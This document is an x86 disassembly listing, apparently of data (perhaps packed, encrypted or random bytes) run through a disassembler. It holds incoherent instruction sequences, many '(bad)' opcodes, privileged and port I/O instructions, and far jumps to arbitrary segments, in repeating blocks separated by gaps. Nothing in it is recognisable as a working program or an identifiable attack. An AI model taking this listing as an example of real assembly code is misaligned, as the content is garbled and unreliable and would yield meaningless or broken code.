  42e552:	dec    ebp
  42e553:	rol    DWORD PTR [edi+0x67],cl
  42e556:	dec    ebp
  42e557:	sti    
  42e558:	sbb    ch,bl
  42e55a:	push   esi
  42e55b:	add    al,0xb3
  42e55d:	add    al,0x6
  42e55f:	mov    eax,0x377704c2
  42e564:	mov    edi,0x4a99f0d0
  42e569:	inc    ebx
  42e56a:	and    ah,dh
  42e56c:	sub    eax,0xf99a6d09
  42e571:	lods   al,BYTE PTR ds:[esi]
  42e572:	icebp  
  42e573:	adc    BYTE PTR [edi+0x373b5488],dh
  42e579:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42e57a:	and    al,0x33
  42e57c:	mov    al,0x22
  42e57e:	pop    esi
  42e57f:	(bad)  
  42e581:	loopne 0x42e51e
  42e583:	pop    ebp
  42e584:	cmp    al,0x2d
  42e586:	test   al,0x34
  42e588:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42e589:	sub    eax,0xd9df3e97
  42e58e:	fild   QWORD PTR [esi]
  42e590:	mov    DWORD PTR [eax],eax
	...
  42e5f2:	add    BYTE PTR [eax],al
  42e5f4:	push   ebp
  42e5f5:	cmp    dh,cl
  42e5f7:	adc    bh,ch
  42e5f9:	neg    bh
  42e5fb:	jge    0x42e58f
  42e5fd:	xchg   ebp,eax
  42e5fe:	jns    0x42e631
  42e600:	ja     0x42e652
  42e602:	jne    0x42e61f
  42e604:	pop    esi
  42e605:	icebp  
  42e606:	add    DWORD PTR [eax],eax
  42e608:	add    eax,0x43000001
  42e60d:	jmp    0x42e679
  42e60f:	loop   0x42e59b
  42e611:	or     BYTE PTR [edx],bl
  42e613:	stos   DWORD PTR es:[edi],eax
  42e614:	mov    ds:0x7b016fe0,al
  42e619:	iret   
  42e61a:	jg     0x42e5e7
  42e61c:	dec    eax
  42e61d:	jo     0x42e60d
  42e61f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42e620:	mov    cl,bl
  42e622:	sbb    eax,0xbd4fdb18
  42e627:	add    ebx,DWORD PTR [edi-0x17]
  42e62a:	push   eax
  42e62b:	lock into 
  42e62d:	pop    es
  42e62e:	pop    eax
  42e62f:	(bad)  
  42e630:	call   FWORD PTR fs:[esi+eiz*1-0x2e]
  42e635:	jae    0x42e6a9
  42e637:	lods   al,BYTE PTR ds:[esi]
  42e638:	mov    DWORD PTR [ecx-0x2d],ebp
  42e63b:	push   ds
  42e63c:	xchg   ebx,eax
  42e63d:	or     DWORD PTR [edx],esi
  42e63f:	(bad)  
  42e640:	jae    0x42e60a
  42e642:	(bad)  
  42e643:	shl    BYTE PTR [edi+0x62],cl
  42e646:	jne    0x42e5e7
  42e648:	mov    esi,ebp
  42e64a:	std    
  42e64b:	adc    BYTE PTR [esp+edx*8-0x75],0xf7
  42e650:	inc    edi
  42e651:	stos   DWORD PTR es:[edi],eax
  42e652:	add    BYTE PTR [ecx+0x20cb690c],0xe3
  42e659:	xor    si,sp
  42e65c:	mov    al,0x31
  42e65e:	mov    esp,0xa8b1e933
  42e663:	mov    esi,0x35052a52
  42e668:	xor    eax,0x396f7326
  42e66d:	cmc    
  42e66e:	lahf   
  42e66f:	in     al,0x9e
  42e671:	push   cs
  42e672:	les    eax,FWORD PTR [edi+ebp*4+0xa0524b7]
  42e679:	push   ecx
  42e67a:	cdq    
  42e67b:	bnd jno 0x42e639
  42e67e:	xchg   BYTE PTR [eax-0x6e],ah
  42e681:	inc    esp
  42e682:	aad    0x59
  42e684:	xchg   edx,eax
  42e685:	sbb    ebx,ecx
  42e687:	int3   
  42e688:	sbb    edi,esp
  42e68a:	les    ebx,FWORD PTR [edx+0x28b9e00c]
  42e690:	je     0x42e6ba
  42e692:	mov    DWORD PTR [edi+0x71b06fee],edx
  42e698:	call   0x3957def3
  42e69d:	test   DWORD PTR [ecx-0x11],0x11e7531d
  42e6a4:	xchg   edx,eax
  42e6a5:	adc    al,0x39
  42e6a7:	mov    DWORD PTR [eax+0x36bba0dd],edx
  42e6ad:	ficomp DWORD PTR [ebx+0x63]
  42e6b0:	add    edx,DWORD PTR [ebp-0x485204ca]
  42e6b6:	fcom   st(7)
  42e6b8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42e6b9:	in     eax,0x44
  42e6bb:	add    DWORD PTR [eax+0x2a],0xffffff89
  42e6bf:	add    BYTE PTR [eax-0x12e00bc8],dh
  42e6c5:	enter  0x3c2e,0x50
  42e6c9:	jb     0x42e663
  42e6cb:	int3   
  42e6cc:	sub    bl,dl
  42e6ce:	sti    
  42e6cf:	into   
  42e6d0:	or     BYTE PTR [edi+0x3d],0x8b
  42e6d4:	sub    eax,0x1453e9ef
  42e6d9:	jmp    0xf98:0x1a74cd88
  42e6e0:	mov    esi,0x8f9c4184
  42e6e5:	cdq    
  42e6e6:	jmp    0x4e37d028
  42e6eb:	mov    ebx,0x2ab88c7
  42e6f0:	les    ebx,FWORD PTR [edi]
  42e6f2:	icebp  
  42e6f3:	lods   al,BYTE PTR ds:[esi]
  42e6f4:	pop    ds
  42e6f5:	jo     0x42e762
  42e6f7:	cmp    DWORD PTR [eax+0x6f026404],edi
  42e6fd:	daa    
  42e6fe:	mov    al,0x4c
  42e700:	jecxz  0x42e75a
  42e702:	jns    0x42e6e9
  42e704:	pop    ecx
  42e705:	clc    
  42e706:	add    eax,0x51c85c94
  42e70b:	xor    cl,BYTE PTR [edx+eax*8+0xd70114]
	...
  42e772:	add    BYTE PTR [eax],al
  42e774:	pop    edx
  42e775:	cmp    DWORD PTR [esi+0x2d],ecx
  42e778:	outs   dx,DWORD PTR ds:[esi]
  42e779:	jg     0x42e7f6
  42e77b:	jg     0x42e7e1
  42e77d:	sub    BYTE PTR [esi],cl
  42e77f:	fcmovb st,st(3)
  42e781:	sahf   
  42e782:	loop   0x42e797
  42e784:	arpl   dx,si
  42e786:	add    DWORD PTR [eax],eax
  42e788:	add    eax,0x74000001
  42e78d:	inc    eax
  42e78e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42e78f:	test   BYTE PTR [ecx+ebp*8-0x7f],ah
  42e793:	sar    DWORD PTR [edi+0x3bc9e8b3],0x39
  42e79a:	cmp    BYTE PTR [ebx-0x20],ch
  42e79d:	dec    edx
  42e79e:	mov    cl,0xee
  42e7a0:	in     al,dx
  42e7a1:	fidivr DWORD PTR [edx-0x5d597253]
  42e7a7:	(bad)
  42e7aa:	(bad)  [ebx]
  42e7ac:	inc    eax
  42e7ad:	jge    0x42e735
  42e7af:	add    al,0x7f
  42e7b1:	test   al,0xae
  42e7b3:	test   DWORD PTR [ecx+0x4b],ebp
  42e7b6:	xchg   DWORD PTR [ecx],ebp
  42e7b8:	xor    DWORD PTR ds:0x65f32187,ecx
  42e7be:	inc    esp
  42e7bf:	mov    ds:0xa399ffc4,al
  42e7c4:	or     DWORD PTR [edi-0x14],edi
  42e7c7:	retf   0x6f6a
  42e7ca:	mov    esp,0xa071f599
  42e7cf:	cmp    al,0xb3
  42e7d1:	sbb    al,0xe0
  42e7d3:	sbb    DWORD PTR [esi],0x964d66c0
  42e7d9:	push   cs
  42e7da:	sub    ch,BYTE PTR [ebp+0x38d8a0d6]
  42e7e0:	lods   eax,DWORD PTR ds:[esi]
  42e7e1:	popf   
  42e7e2:	push   ebx
  42e7e3:	push   ebp
  42e7e4:	loope  0x42e805
  42e7e6:	cmp    eax,0x2ce11ccc
  42e7eb:	add    edx,DWORD PTR [eax+0x7826f193]
  42e7f1:	sub    BYTE PTR fs:[ebx+0xd],bh
  42e7f5:	bnd jmp DWORD PTR [ebx+0x6f976d1e]
  42e7fc:	mov    al,ds:0xf5154787
  42e801:	xchg   BYTE PTR [ebx+0x72],dl
  42e804:	sub    eax,0x8c165dd1
  42e809:	arpl   WORD PTR [edi+0x47],bx
  42e80c:	pop    es
  42e80d:	or     edx,DWORD PTR [ecx]
  42e80f:	add    cl,BYTE PTR ds:0x61f6e86d
  42e815:	rol    BYTE PTR [ecx-0x6b86c4f2],1
  42e81b:	clc    
  42e81c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42e81d:	cs jmp 0x42e7c4
  42e820:	scas   al,BYTE PTR es:[edi]
  42e821:	pop    esi
  42e822:	mov    cl,0x1d
  42e824:	jbe    0x42e8a1
  42e826:	(bad)  
  42e827:	sub    al,0x97
  42e829:	les    edi,FWORD PTR [esi+0x47]
  42e82c:	jmp    0xaf80:0x25e921cb
  42e833:	sti    
  42e834:	shl    ebp,cl
  42e836:	jne    0x42e829
  42e838:	xlat   BYTE PTR ds:[ebx]
  42e839:	test   eax,0x38816447
  42e83e:	(bad)  
  42e83f:	daa    
  42e840:	stc    
  42e841:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42e842:	(bad)  
  42e843:	cli    
  42e844:	sub    BYTE PTR [ecx],ch
  42e846:	mov    esi,0x6d0b706
  42e84b:	mov    ds:0xfe95173e,al
  42e850:	jp     0x42e843
  42e852:	and    DWORD PTR [ecx-0x7bdf0f30],esp
  42e858:	bound  ecx,QWORD PTR [ebx+ebp*4+0x70]
  42e85c:	hlt    
  42e85d:	cwde   
  42e85e:	lods   al,BYTE PTR ds:[esi]
  42e85f:	xchg   esp,eax
  42e860:	xchg   edx,eax
  42e861:	sti    
  42e862:	adc    al,0xc2
  42e864:	repnz repnz scas al,BYTE PTR es:[edi]
  42e867:	push   ebp
  42e868:	(bad)  
  42e869:	mov    edx,0x5bac42a9
  42e86e:	aas    
  42e86f:	and    al,0x60
  42e871:	mov    eax,ds:0x504e291c
  42e876:	jbe    0x42e8ca
  42e878:	inc    esp
  42e879:	jp     0x42e870
  42e87b:	not    BYTE PTR es:[eax]
  42e87e:	xor    al,0xd1
  42e880:	std    
  42e881:	mov    ah,0x85
  42e883:	jbe    0x42e89d
  42e885:	fsub   QWORD PTR [esp+edx*2+0x9]
  42e889:	pop    es
  42e88a:	add    DWORD PTR [ecx+0x5d2dfae1],esp
  42e890:	jno    0x42e892
	...
  42e8f2:	add    BYTE PTR [eax],al
  42e8f4:	ret    
  42e8f5:	ja     0x42e957
  42e8f7:	and    al,0xf4
  42e8f9:	aaa    
  42e8fa:	(bad)  
  42e8fb:	div    DWORD PTR [ecx+0x2a23f82b]
  42e901:	mov    WORD PTR [esi],fs
  42e903:	lea    ebp,[eax-0xd]
  42e906:	add    DWORD PTR [eax],eax
  42e908:	add    eax,0x1c000001
  42e90d:	mov    bl,0xf6
  42e90f:	fcmovu st,st(1)
  42e911:	hlt    
  42e912:	ficomp WORD PTR [esi]
  42e914:	add    eax,0x1976f3f
  42e919:	movs   BYTE PTR es:[di],BYTE PTR ds:[si]
  42e91b:	xchg   esi,ecx
  42e91d:	pop    esi
  42e91e:	iret   
  42e91f:	mov    ds:0xde9fd1ee,al
  42e924:	test   al,0x5c
  42e926:	test   eax,0xe57b29c2
  42e92b:	sbb    eax,0xda4a25a1
  42e930:	hlt    
  42e931:	scas   al,BYTE PTR es:[edi]
  42e932:	adc    al,0xde
  42e934:	or     al,0xd0
  42e936:	loopne 0x42e985
  42e938:	inc    ebp
  42e939:	in     al,0x7
  42e93b:	pop    ss
  42e93c:	jnp    0x42e97a
  42e93e:	xor    DWORD PTR [esp+ebp*4+0x1592f90d],ebx
  42e945:	das    
  42e946:	dec    ecx
  42e947:	jle    0x42e8e4
  42e949:	ficom  WORD PTR [edi-0x72]
  42e94c:	xchg   ebp,eax
  42e94d:	push   eax
  42e94e:	mov    al,ds:0x72582992
  42e953:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42e954:	cmp    BYTE PTR [ebp+0x7c4d3a7a],dl
  42e95a:	stos   BYTE PTR es:[edi],al
  42e95b:	push   edi
  42e95c:	clc    
  42e95d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42e95e:	sbb    eax,0x841a83f6
  42e963:	icebp  
  42e964:	dec    edx
  42e965:	cmp    dh,0xbd
  42e968:	out    0x22,eax
  42e96a:	(bad)  
  42e96b:	fiadd  DWORD PTR [eax]
  42e96d:	or     dh,BYTE PTR [ecx]
  42e96f:	call   0x12ec:0x5ccc61a4
  42e976:	mov    al,ds:0xee971efa
  42e97b:	jmp    0xf090261
  42e980:	int3   
  42e981:	enter  0x5be6,0x8e
  42e985:	add    bh,BYTE PTR [edi]
  42e987:	mov    esi,0x4c8c1b25
  42e98c:	clc    
  42e98d:	mov    ds:0xc73eae31,eax
  42e992:	(bad)  
  42e993:	(bad)  
  42e994:	ss inc ecx
  42e996:	sbb    BYTE PTR [esi-0x3a97bc2a],dh
  42e99c:	lahf   
  42e99d:	xor    ebp,edi
  42e99f:	pusha  
  42e9a0:	mov    ebx,0xa56638e7
  42e9a5:	popf   
  42e9a6:	sub    eax,0x583907c
  42e9ab:	adc    bl,BYTE PTR ds:0xf649844d
  42e9b1:	fs clc 
  42e9b3:	mov    ch,0x90
  42e9b5:	scas   al,BYTE PTR es:[edi]
  42e9b6:	mov    bh,0xf8
  42e9b8:	and    DWORD PTR [esi-0x58adb952],ebx
  42e9be:	imul   edi,DWORD PTR [edi+edx*8-0x2e],0x60
  42e9c3:	mov    eax,ds:0x121a4f2d
  42e9c8:	add    DWORD PTR [ebp+0x4ac36be5],0xffffff99
  42e9cf:	xchg   edi,eax
  42e9d1:	mov    ah,0x9a
  42e9d3:	xchg   esp,eax
  42e9d4:	clc    
  42e9d5:	mov    edi,0x7602c53
  42e9da:	rol    DWORD PTR [esp+eax*1+0x41967224],0xa8
  42e9e2:	test   eax,0xdeeb9824
  42e9e7:	or     DWORD PTR [ebx],ecx
  42e9e9:	nop
  42e9ea:	repz fbld TBYTE PTR ds:0x55d4883a
  42e9f1:	fisubr WORD PTR [ebp+0x27fa518]
  42e9f7:	jecxz  0x42ea12
  42e9f9:	pushf  
  42e9fa:	mov    edi,0x1c8caceb
  42e9ff:	jg     0x42e999
  42ea01:	lods   al,BYTE PTR ds:[esi]
  42ea02:	cs mov bh,0x91
  42ea05:	sbb    al,0xa3
  42ea07:	std    
  42ea08:	mov    ah,0xe6
  42ea0a:	sbb    bl,BYTE PTR [ebp+0x14910b8b]
  42ea10:	xchg   ecx,eax
	...
  42ea71:	add    BYTE PTR [eax],al
  42ea73:	add    ch,ah
  42ea75:	mov    edx,0xebdfe392
  42ea7a:	cmc    
  42ea7b:	mov    esi,0x66dc160c
  42ea80:	fld    TBYTE PTR [ebx-0xb9263db]
  42ea86:	add    DWORD PTR [eax],eax
  42ea88:	add    eax,0x8c000001
  42ea8d:	and    bh,BYTE PTR [edi-0x44]
  42ea90:	dec    ecx
  42ea91:	lock mov cl,0x17
  42ea94:	adc    BYTE PTR [ebp-0x65],dl
  42ea97:	cmp    eax,0x2329e3fc
  42ea9c:	fwait
  42ea9d:	sub    bh,ah
  42ea9f:	sub    al,0xcb
  42eaa1:	sub    DWORD PTR [edx-0x46e346bf],eax
  42eaa7:	xchg   ecx,eax
  42eaa8:	dec    ebp
  42eaa9:	lahf   
  42eaaa:	scas   eax,DWORD PTR es:[edi]
  42eaab:	ret    
  42eaac:	inc    ebx
  42eaad:	push   cs
  42eaae:	sbb    ecx,edx
  42eab0:	in     al,dx
  42eab1:	je     0x42eae4
  42eab3:	dec    edx
  42eab4:	lea    esi,fs:[ebp-0x52]
  42eab8:	cmp    ch,ah
  42eaba:	and    al,0x8c
  42eabc:	and    eax,0xdf0cde69
  42eac1:	mov    ecx,0xdc678b4a
  42eac6:	cmp    BYTE PTR [esi+ecx*1+0x1],dh
  42eaca:	push   ds
  42eacb:	int3   
  42eacc:	xchg   edi,eax
  42eacd:	inc    eax
  42eace:	sub    al,0x5d
  42ead0:	xchg   esp,eax
  42ead1:	mov    ds:0xa25f0e47,eax
  42ead6:	push   0xffffffd9
  42ead8:	js     0x42eb0c
  42eada:	xor    BYTE PTR [ecx],ch
  42eadc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42eadd:	(bad)  
  42eade:	and    al,0x83
  42eae0:	or     DWORD PTR [edx+0x68],0x62
  42eae4:	adc    al,0xb7
  42eae6:	sbb    edi,ebp
  42eae8:	jmp    0x42eac1
  42eaea:	cs xchg ebx,eax
  42eaec:	push   edi
  42eaed:	or     bh,cl
  42eaef:	or     dl,al
  42eaf1:	lock loopne 0x42eaf2
  42eaf4:	cli    
  42eaf5:	xor    DWORD PTR [ebx+edx*8],esi
  42eaf8:	daa    
  42eaf9:	stos   DWORD PTR es:[edi],eax
  42eafa:	stos   BYTE PTR es:[edi],al
  42eafb:	lods   eax,DWORD PTR ds:[esi]
  42eafc:	mov    WORD PTR [esi],?
  42eafe:	into   
  42eaff:	mov    eax,0x45ca1f21
  42eb04:	pop    esp
  42eb05:	push   ebx
  42eb06:	xchg   ecx,eax
  42eb07:	mov    BYTE PTR [edx],ch
  42eb09:	lahf   
  42eb0a:	add    cl,ch
  42eb0c:	and    DWORD PTR [ebp+0x4dee278c],0x25
  42eb13:	std    
  42eb14:	xor    al,0xde
  42eb16:	loope  0x42eb0a
  42eb18:	test   al,0x25
  42eb1a:	or     ecx,esp
  42eb1c:	mov    ah,0xe3
  42eb1e:	cmp    edi,DWORD PTR [ebx+eiz*8]
  42eb21:	loop   0x42eaa4
  42eb23:	jle    0x42eaf3
  42eb25:	call   0xa2a9:0x865e3d74
  42eb2c:	rcr    BYTE PTR [edi-0x73d59073],cl
  42eb32:	outs   dx,DWORD PTR ds:[esi]
  42eb33:	popa   
  42eb34:	das    
  42eb35:	cmp    DWORD PTR [ebx],0x45a90c52
  42eb3b:	ror    BYTE PTR [esi+0x1d],cl
  42eb3e:	aam    0xbd
  42eb40:	push   ecx
  42eb41:	stos   BYTE PTR es:[edi],al
  42eb42:	and    BYTE PTR [ebp+esi*8-0x5d45c816],bh
  42eb49:	mov    esi,0xfc202270
  42eb4e:	(bad)  
  42eb50:	mov    ah,0xf8
  42eb52:	cs cld 
  42eb54:	or     BYTE PTR [ebx],bh
  42eb56:	mov    bh,0xe0
  42eb58:	inc    esi
  42eb59:	inc    ebp
  42eb5a:	xor    ebx,DWORD PTR [ecx+0x31]
  42eb5d:	jmp    0x7e67:0xc0416286
  42eb64:	and    cl,bh
  42eb66:	aad    0xd1
  42eb68:	scas   al,BYTE PTR es:[edi]
  42eb69:	mov    edi,0x7526fd8c
  42eb6e:	add    eax,0x62f3575b
  42eb73:	cmp    BYTE PTR [edx+0x2d641687],cl
  42eb79:	xchg   BYTE PTR [eax-0x277a7a02],bh
  42eb7f:	pop    edi
  42eb80:	sbb    ecx,ebx
  42eb82:	repnz clc 
  42eb84:	jmp    0x8273:0x253770db
  42eb8b:	pop    ss
  42eb8c:	xlat   BYTE PTR ds:[ebx]
  42eb8d:	addr16 add eax,0x910
	...
  42ebf3:	add    BYTE PTR [esi+0x41],bh
  42ebf6:	jne    0xfc41bb3b
  42ebfc:	pusha  
  42ebfd:	popf   
  42ebfe:	pop    ecx
  42ebff:	adc    DWORD PTR [esi],0x72039735
  42ec05:	cmc    
  42ec06:	add    DWORD PTR [eax],eax
  42ec08:	add    eax,0xf1000001
  42ec0d:	xchg   edx,eax
  42ec0e:	mov    ebx,DWORD PTR [ebp+0xd]
  42ec11:	xchg   ebx,eax
  42ec12:	pop    ecx
  42ec13:	call   0x7579452f
  42ec18:	mov    esp,DWORD PTR [ebp+0x75]
  42ec1b:	mov    edi,0x82c529dc
  42ec20:	ins    BYTE PTR es:[edi],dx
  42ec21:	mov    edi,0x797b0dc2
  42ec26:	lock xchg ecx,eax
  42ec28:	xor    DWORD PTR [edi],0xffffffd4
  42ec2b:	and    al,0x1b
  42ec2d:	jbe    0x42ec7e
  42ec2f:	dec    ebx
  42ec30:	push   esp
  42ec31:	outs   dx,WORD PTR ds:[esi]
  42ec33:	(bad)  
  42ec34:	cmp    eax,0x736d2bc9
  42ec39:	dec    eax
  42ec3a:	xchg   esi,eax
  42ec3b:	mov    ah,BYTE PTR [ecx]
  42ec3d:	mov    esi,edi
  42ec3f:	(bad)  
  42ec40:	shr    DWORD PTR [ebx],0xb0
  42ec43:	ss dec ebx
  42ec45:	xchg   ecx,eax
  42ec46:	pop    ebx
  42ec47:	ins    BYTE PTR es:[edi],dx
  42ec48:	sub    al,0x32
  42ec4a:	adc    eax,0x90b864ff
  42ec4f:	cld    
  42ec50:	mov    ebp,0x1120c446
  42ec55:	push   ecx
  42ec56:	adc    al,0xa4
  42ec58:	mov    al,ds:0x9bd80ac6
  42ec5d:	test   al,0x51
  42ec5f:	fs aaa 
  42ec61:	jno    0x42ec1d
  42ec63:	jae    0x42ecd9
  42ec65:	or     BYTE PTR [edx+0x2de1715f],0x36
  42ec6c:	sub    eax,0x92b30f05
  42ec71:	adc    al,0xd0
  42ec73:	adc    DWORD PTR [edi-0x43],0x7d
  42ec77:	jnp    0x42ec1c
  42ec79:	ins    BYTE PTR es:[edi],dx
  42ec7a:	ins    BYTE PTR es:[edi],dx
  42ec7b:	mov    esi,esi
  42ec7d:	jmp    0x810d6106
  42ec82:	inc    eax
  42ec83:	js     0x42ecaa
  42ec85:	mov    eax,ds:0x15f3b458
  42ec8a:	xlat   BYTE PTR ds:[ebx]
  42ec8b:	aas    
  42ec8c:	cmc    
  42ec8d:	pop    ds
  42ec8e:	rol    BYTE PTR [edx],1
  42ec90:	(bad)  [ecx+eax*8]
  42ec93:	jbe    0x42ec70
  42ec95:	call   0xb252:0x37744d7e
  42ec9c:	pop    ecx
  42ec9d:	retf   
  42ec9e:	aaa    
  42ec9f:	in     al,0xb6
  42eca1:	(bad)
  42eca4:	jne    0x42ecd2
  42eca6:	jns    0x42ec5e
  42eca8:	fisttp QWORD PTR [ecx]
  42ecaa:	lds    ecx,FWORD PTR [edi-0x64ff9f2a]
  42ecb0:	mov    eax,0x2a136aa
  42ecb5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42ecb6:	(bad)  
  42ecb7:	sbb    al,0x44
  42ecb9:	out    dx,eax
  42ecba:	inc    ecx
  42ecbb:	pop    ebx
  42ecbc:	out    dx,eax
  42ecbd:	retf   
  42ecbe:	hlt    
  42ecbf:	dec    ebp
  42ecc0:	pop    esi
  42ecc1:	add    esp,0x8c983947
  42ecc7:	mov    al,al
  42ecc9:	mov    ebp,0xa73ceb5b
  42ecce:	out    dx,al
  42eccf:	scas   al,BYTE PTR es:[edi]
  42ecd0:	xchg   ecx,eax
  42ecd1:	or     eax,0x84f68cfb
  42ecd6:	sbb    al,0xb3
  42ecd8:	aam    0xb8
  42ecda:	sbb    BYTE PTR [eax+0x1e795d60],al
  42ece0:	sub    ah,BYTE PTR [eax+0x34161f48]
  42ece6:	cli    
  42ece7:	jg     0x42ed3b
  42ece9:	sbb    al,0x3d
  42eceb:	fidiv  DWORD PTR [ebx+eiz*8-0x2b796920]
  42ecf2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42ecf3:	ja     0x42ed34
  42ecf5:	out    0x12,al
  42ecf7:	add    edx,DWORD PTR [edx-0x11]
  42ecfa:	mov    dl,0xef
  42ecfc:	push   eax
  42ecfd:	mov    edi,0x7b5bc38c
  42ed02:	shr    DWORD PTR [edx],0x97
  42ed05:	les    edi,FWORD PTR [edx-0x2a39745b]
  42ed0b:	and    BYTE PTR [ebp+0x1344239f],0x0
	...
  42ed72:	add    BYTE PTR [eax],al
  42ed74:	sub    dh,dh
  42ed76:	scas   eax,DWORD PTR es:[edi]
  42ed77:	fdivr  st,st(7)
  42ed79:	fnstcw WORD PTR [edi-0xa]
  42ed7c:	jecxz  0x42edb0
  42ed7e:	test   DWORD PTR [edx-0x1e735e7c],esp
  42ed84:	ja     0x42ed7c
  42ed86:	add    DWORD PTR [eax],eax
  42ed88:	add    eax,0x37000001
  42ed8d:	jno    0x42edae
  42ed8f:	sti    
  42ed90:	and    eax,0x38873011
  42ed95:	int    0x41
  42ed97:	cmp    dl,al
  42ed99:	retf   0xdd66
  42ed9c:	mov    ebp,DWORD PTR [esi]
  42ed9e:	sub    ecx,esp
  42eda0:	mov    esp,0x266e8d4c
  42eda5:	neg    DWORD PTR [ecx+0x18]
  42eda8:	pop    edx
  42eda9:	ret    
  42edaa:	(bad)  
  42edab:	(bad)  
  42edac:	and    BYTE PTR [edx-0x2],dl
  42edaf:	mov    esi,0x25adf51a
  42edb4:	in     eax,0xcf
  42edb6:	or     al,0x48
  42edb8:	repnz lds esp,FWORD PTR [edi]
  42edbb:	into   
  42edbc:	jmp    0x4863:0x378e250c
  42edc3:	push   cs
  42edc4:	mov    dl,0x9c
  42edc6:	cld    
  42edc7:	aaa    
  42edc8:	cld    
  42edc9:	test   DWORD PTR [ecx-0x9],edx
  42edcc:	and    ch,BYTE PTR [eax]
  42edce:	int    0x2d
  42edd0:	xor    BYTE PTR [esi-0x1d142433],0x9
  42edd7:	inc    esi
  42edd8:	xchg   edi,eax
  42edd9:	rol    DWORD PTR [edx-0x4ea0beb1],cl
  42eddf:	imul   edi,eax,0xffffff8a
  42ede2:	sbb    dl,BYTE PTR [ebp-0x108fd5b2]
  42ede8:	(bad)  
  42ede9:	clc    
  42edea:	mov    eax,0x2c353b34
  42edef:	in     eax,0xb1
  42edf1:	mov    dl,0xbb
  42edf3:	into   
  42edf4:	mov    dl,0x9a
  42edf6:	adc    DWORD PTR [ebp-0x491dedef],edi
  42edfc:	in     al,0x81
  42edfe:	inc    ecx
  42edff:	call   0x6ff4499e
  42ee04:	ins    BYTE PTR es:[edi],dx
  42ee05:	daa    
  42ee06:	sub    al,0xe2
  42ee08:	addr16 mov ds:0xe61e,al
  42ee0c:	and    al,0xc2
  42ee0e:	retf   0x57a5
  42ee11:	adc    eax,0x6d337eae
  42ee16:	and    eax,0xb3341442
  42ee1c:	out    dx,eax
  42ee1d:	ror    bh,cl
  42ee1f:	test   BYTE PTR [esi-0x1d],cl
  42ee22:	or     DWORD PTR [esi],ecx
  42ee24:	jns    0x42ee72
  42ee26:	push   edx
  42ee27:	cmp    cl,BYTE PTR [ebx+0x537ea09]
  42ee2d:	add    DWORD PTR ds:0x861cd2df,ebx
  42ee33:	sti    
  42ee34:	arpl   WORD PTR [eax],bx
  42ee36:	out    dx,eax
  42ee37:	(bad)  
  42ee38:	fstp   DWORD PTR [edi]
  42ee3a:	outs   dx,DWORD PTR ds:[esi]
  42ee3b:	and    eax,0xc48c9d1c
  42ee40:	imul   esi,ebp,0xaa310b80
  42ee46:	xchg   edx,eax
  42ee47:	out    0x1,al
  42ee49:	pop    edi
  42ee4a:	ss pusha 
  42ee4c:	pop    es
  42ee4d:	or     eax,DWORD PTR [ebx-0x76b5a21b]
  42ee53:	imul   esi,ebx,0xb7438366
  42ee59:	sub    DWORD PTR [eax+0x69],eax
  42ee5c:	pop    ds
  42ee5d:	jecxz  0x42ee56
  42ee5f:	popf   
  42ee60:	inc    ebx
  42ee61:	lock scas al,BYTE PTR es:[edi]
  42ee63:	jl     0x42ee2a
  42ee65:	dec    ecx
  42ee66:	repz dec edi
  42ee68:	fidiv  DWORD PTR [eax]
  42ee6a:	aas    
  42ee6b:	nop
  42ee6c:	adc    DWORD PTR [esi],esp
  42ee6e:	cdq    
  42ee6f:	mov    bh,0xd4
  42ee71:	(bad)  
  42ee73:	ficomp WORD PTR [edx-0x7a]
  42ee76:	mov    dl,0xef
  42ee78:	cld    
  42ee79:	lock xchg edi,eax
  42ee7b:	pop    esp
  42ee7c:	dec    ecx
  42ee7d:	daa    
  42ee7e:	out    dx,al
  42ee7f:	pop    ebp
  42ee80:	into   
  42ee81:	in     eax,dx
  42ee82:	jne    0x42eecf
  42ee84:	mov    WORD PTR [edi+0x56],?
  42ee87:	add    al,BYTE PTR [edi]
  42ee89:	aad    0x5
  42ee8b:	push   cs
  42ee8c:	fisub  DWORD PTR [ecx+0x4d3a61]
	...
  42eef2:	add    BYTE PTR [eax],al
  42eef4:	ret    
  42eef5:	add    cl,BYTE PTR [eax]
  42eef7:	xor    eax,0xf6ff3fc9
  42eefc:	jb     0x42ef3a
  42eefe:	jae    0x42ef25
  42ef00:	ret    0x2168
  42ef03:	inc    edx
  42ef04:	jl     0x42eefd
  42ef06:	add    DWORD PTR [eax],eax
  42ef08:	add    eax,0x26000001
  42ef0d:	loopne 0x42eedd
  42ef0f:	pop    esi
  42ef10:	add    eax,0x4d7d95ca
  42ef15:	sbb    BYTE PTR [edx+0x6b1b51fb],al
  42ef1b:	lea    ecx,[ebx]
  42ef1d:	mov    ebx,0x8289991e
  42ef22:	add    BYTE PTR [ebp-0x29],bl
  42ef25:	sbb    dh,BYTE PTR ds:0xa633c933
  42ef2b:	cmp    dh,BYTE PTR [eax+0x42ab955a]
  42ef31:	in     al,dx
  42ef32:	cwde   
  42ef33:	icebp  
  42ef34:	retf   
  42ef35:	push   ds
  42ef36:	inc    esi
  42ef37:	pop    esi
  42ef38:	nop
  42ef39:	(bad)  
  42ef3a:	jge    0x42ef30
  42ef3c:	aam    0xf
  42ef3e:	out    dx,al
  42ef3f:	das    
  42ef40:	ret    
  42ef41:	lea    ebx,[esp+ebx*1]
  42ef44:	sahf   
  42ef45:	pop    eax
  42ef46:	(bad)  
  42ef47:	xor    DWORD PTR [edi],esi
  42ef49:	push   ebp
  42ef4a:	mov    ss,WORD PTR [eax+0x58114ad1]
  42ef50:	(bad)  
  42ef51:	jmp    0x42ef9a
  42ef53:	inc    ecx
  42ef54:	and    BYTE PTR [ecx],dh
  42ef56:	or     DWORD PTR [eax+0x3891dd8b],ebx
  42ef5c:	jmp    0x1fdc5151
  42ef61:	nop
  42ef62:	sbb    eax,DWORD PTR [esi]
  42ef64:	mov    eax,0xa47e6c88
  42ef69:	cbw    
  42ef6b:	call   0xc1b4:0x5121fd6e
  42ef72:	(bad)  
